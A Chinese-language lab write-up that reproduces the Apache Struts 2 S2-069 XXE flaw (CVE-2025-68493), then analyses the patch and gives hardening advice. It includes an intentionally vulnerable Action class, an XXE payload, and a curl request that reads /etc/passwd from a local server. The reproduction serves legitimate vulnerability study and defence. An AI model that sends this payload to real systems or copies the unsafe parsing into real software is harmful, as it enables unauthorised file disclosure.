# CVE-2025-68493｜Apache Struts 2 (S2-069) 外部实体（XXE）注入漏洞复现

## 1. 漏洞概述
**漏洞编号**：CVE-2025-68493  
**漏洞名称**：Apache Struts 2 (S2-069) 外部实体（XXE）注入漏洞  
**漏洞危害**：高危。攻击者可以利用此漏洞实现任意文件读取、服务端请求伪造（SSRF）或执行简单的拒绝服务攻击（DoS）。  
**漏洞成因**：Struts 2 提供的 `DomHelper.parse` 工具方法在解析 XML 数据时，默认未禁用外部实体（External Entity）和 DTD 的解析，导致了经典的 XXE 注入。

## 2. 影响范围
- **受影响版本**：Apache Struts 6.0.0 至 6.1.0
- **修复版本**：Apache Struts 6.1.1 及以上版本

> **注意**：该漏洞并非 Struts 2 的默认开启点，只有当开发人员在代码中显式调用了 `DomHelper.parse()` 来处理不受信任的用户输入时才会触发。

---

## 3. 环境构建 (Reproduction Lab)

### 3.1 漏洞代码实现 (`XXEAction.java`)
开发一个简单的 Action，接收 XML 字符串并调用漏洞方法：

```java
package com.demo.action;

import com.opensymphony.xwork2.ActionSupport;
import com.opensymphony.xwork2.util.DomHelper;
import org.w3c.dom.Document;
import org.xml.sax.InputSource;
import java.io.StringReader;

public class XXEAction extends ActionSupport {
    private String xmlContent;
    private String result;

    public String execute() {
        try {
            if (xmlContent != null && !xmlContent.isEmpty()) {
                // --- 漏洞触发点 ---
                InputSource source = new InputSource(new StringReader(xmlContent));
                Document doc = DomHelper.parse(source); 
                // ----------------
                
                if (doc != null && doc.getDocumentElement() != null) {
                    this.result = "XXE Content: " + doc.getDocumentElement().getTextContent();
                }
            }
        } catch (Exception e) {
            this.result = "Error: " + e.toString();
        }
        return SUCCESS;
    }
    // Getters and Setters...
}
```

### 3.2 Maven 配置 (`pom.xml`)
使用受影响的 **6.0.3** 版本进行复现：

```xml
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>6.0.3</version>
</dependency>
```

### 3.3 Docker 部署
使用 Tomcat 9 容器运行 WAR 包，并模拟生产环境配置。

---

## 4. 漏洞复现 (PoC)

### 4.1 攻击 Payload 构造
构造一个读取 `/etc/passwd` (Linux) 或 `/flag` 的 XML Payload：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 4.2 发送测试请求
使用 `curl` 发送 POST 请求：

```bash
curl -s -X POST "http://localhost:8080/xxe.action" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'xmlContent=<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### 4.3 预期结果
如果漏洞存在且环境未加固，页面回显将直接包含读取到的系统文件内容：
```text
XXE Content: root:x:0:0:root:/root:/bin/bash...
```

---

## 5. 源码深度分析

### 5.1 漏洞根源 (受影响版本 6.0.x)
在 `com.opensymphony.xwork2.util.DomHelper.java` 中，`parse` 方法初始化 `SAXParserFactory` 后直接进行了解析，没有任何安全防护配置：

```java
public static Document parse(InputSource inputSource, Map<String, String> dtdMappings) {
    // ...
    if (factory == null) {
        factory = SAXParserFactory.newInstance();
    }
    // 未禁用外部实体！
    factory.setNamespaceAware(true);
    // ...
    parser.parse(inputSource, ...);
}
```

### 5.2 补丁分析 (修复版本 6.1.1+)
在修复版本中，官方增加了针对 XXE 的防御代码：

```java
try {
    // 关键补丁：禁用外部通用实体和参数实体
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
} catch (ParserConfigurationException | SAXNotRecognizedException | SAXNotSupportedException e) {
    throw new StrutsException("Unable to disable resolving external entities!", e);
}
```

---

## 6. 修复与加固建议

### 6.1 升级 Struts 2 框架 (推荐)
最根本的解决方法是升级到官方修复版本：
- 升级至 **Struts 6.1.1** 或最新稳定版本（如 6.7.0+）。

### 6.2 手动修复方案 (无法升级框架时)
如果由于业务原因无法立即升级框架，应在业务代码中停止使用 `DomHelper.parse()`，改为使用配置安全的 XML 解析器：

```java
import javax.xml.parsers.DocumentBuilderFactory;

// ...
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// 1. 禁止解析 DTD (最安全，但如果业务依赖 DTD 则不可用)
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// 2. 禁用外部通用实体 (General Entities)
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);

// 3. 禁用外部参数实体 (Parameter Entities)
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// 4. 禁止 XInclude
dbf.setXIncludeAware(false);

// 5. 不扩展实体引用
dbf.setExpandEntityReferences(false);
```

### 6.3 临时缓解措施 (WAF)
在 Web 应用防火墙（WAF）上配置规则，拦截包含 `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC` 等关键字的 XML 请求。

**日期**：2026-02-10
